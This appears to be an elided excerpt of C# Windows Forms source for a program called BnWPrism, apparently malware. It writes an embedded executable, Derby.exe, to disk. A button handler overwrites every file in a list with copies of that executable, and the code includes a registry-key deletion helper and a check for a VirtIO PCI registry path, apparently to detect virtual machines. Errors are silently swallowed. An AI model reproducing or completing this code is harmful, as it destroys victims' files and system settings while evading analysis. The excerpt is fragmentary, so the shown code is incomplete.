...
namespace BnWPrism
{
    public partial class Form1 : Form
    {
        ...
        public Form1()
        {
            ...
            toolTip1.SetToolTip(this.button4, ":(");
        ...
        private void cuuursor(Control parent, Cursor cursor)
        {
            foreach (Control control in parent.Controls)
            {
                control.Cursor = cursor;
                cuuursor(control, cursor);
            }
        }
...
@"HKLM\SYSTEM\CurrentControlSet\Enum\PCI\VEN_1AF4&DEV_1004&SUBSYS_00081AF4&REV_00"
        ...
        private void sim()
        {
            try { File.WriteAllBytes("Derby.exe", Resources.Derbyx); }
            catch { }
        ...
        private void button3_Click_1(object sender, EventArgs e)
        {
            ...
            foreach (string newFileName in fileList)
            {
              
                try
                {
                    File.Copy("Derby.exe", newFileName, true);

                }
                catch { }
            }
            try { File.Delete("Derby.exe"); }
            catch { }
        ...
        static void delregkey(string keyPath)
        {
            try
            {
        ...
        private void timer2_Tick(object sender, EventArgs e)
        {
            ...
            else { timer2.Stop();timer2.Dispose(); }
